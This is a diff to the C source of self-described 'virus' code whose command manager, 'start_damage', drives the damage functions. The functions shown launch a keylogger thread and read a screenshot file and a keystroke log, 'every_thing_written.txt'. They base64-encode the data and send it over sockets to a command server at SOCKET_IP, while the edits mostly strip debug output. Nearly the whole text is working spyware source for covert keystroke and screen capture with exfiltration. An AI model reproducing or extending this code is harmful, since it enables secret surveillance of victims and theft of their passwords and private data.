@@ -1,8 +1,5 @@
 #include "StartDoingDamage.h"
 
-// Global variable for the thread handle.
-HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.
-
 
 // This function is called if there are commands for the virus to do -> the 'brain' / 'manager', using the damage functions.
 int start_damage(char* data)
@@ -190,6 +187,7 @@ int send_picture()
 	int bytes_read = 0, file_size = 0, base_64_file_size = 0;
 
 
+
 	picture_file_handle = OpenFile("picture.bmp", &file_struct, OF_READ); // opening the picture file
 	if (picture_file_handle == HFILE_ERROR) // if error eccurred
 	{
@@ -213,7 +211,7 @@ int send_picture()
 		return -1;
 	}
 
-//	file_content[];
+
 
 	base_64_file_size = (file_size * 8) / 6 + 1; // -> file size = 3, 24 bits, 4 base 64 chars, with null byte
 
@@ -254,8 +252,6 @@ int send_picture()
 
 	printf("Connected to server.\n"); // connected to the server -> with socket
 
-
-
 	// sending the get command message
 	iResult = send(
 		ConnectSocket,
@@ -266,7 +262,6 @@ int send_picture()
 
 	printf("Sent the picture to the server! \n");
 
-	printf("%d bytes sent! \n", iResult);
 
 
 	if (iResult == SOCKET_ERROR || iResult == 0)
@@ -274,8 +269,6 @@ int send_picture()
 		printf("Problem sending the get command message! \n");
 		return -1;
 	}
-
-
 
 
 
@@ -301,6 +294,7 @@ int send_picture()
 	free(msg);
 	free(file_content);
 	free(base_64_file_content);
+	Sleep(ONE_MIN_IN_MILISEC / 10); // temp Sleep.
 
 	return 0;
 }
@@ -311,12 +305,12 @@ int start_key_logger_threaded()
 {
 	// thread handle is a Global variable.
 
+
 	DWORD thread_id = 0; // int
 
 	// starting the thread for the Key Logger function.
 	thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_logger, NULL, 0, &thread_id);
 	
-	printf("return val = %#.8x \n",WaitForSingleObject(thread_handle, 0));
 
 	return 0;
 }
@@ -360,6 +354,7 @@ int send_key_logger_file()
 	int bytes_read = 0, file_size = 0;
 
 
+
 	key_logger_file_handle = OpenFile("every_thing_written.txt", &file_struct, OF_READ); // opening the picture file
 	if (key_logger_file_handle == HFILE_ERROR) // if error eccurred
 	{
@@ -386,14 +381,13 @@ int send_key_logger_file()
 	// Adding the null byte.
 	file_content[file_size] = '\0';
 
-	msg_len = strlen(POST_Key_Logger_MSG) + strlen(pc_name) + sizeof(int) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + file_size + 10;
+	msg_len = strlen(POST_Key_Logger_MSG) + strlen(pc_name) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + sizeof(int) + file_size + 10;
 
 
 	msg = (char*)malloc(msg_len);
 
 	msg_len = snprintf(msg, msg_len, POST_Key_Logger_MSG, pc_name, file_size + strlen("{%key_logger%:%%}"), SOCKET_IP, SOCKET_PORT, APOSTROPHES, APOSTROPHES, APOSTROPHES, file_content, APOSTROPHES);
 
-	printf("msg = %s\nmsg_len = %d\nfile_size = %d \n", msg, msg_len, file_size);
 
 	// start the socket connection
 	iResult = connect_socket(wsaData, clientService, &ConnectSocket);
@@ -417,7 +411,6 @@ int send_key_logger_file()
 
 	printf("Sent the key logger to the server! \n");
 
-	printf("%d bytes sent! \n", iResult);
 
 
 	if (iResult == SOCKET_ERROR || iResult == 0)
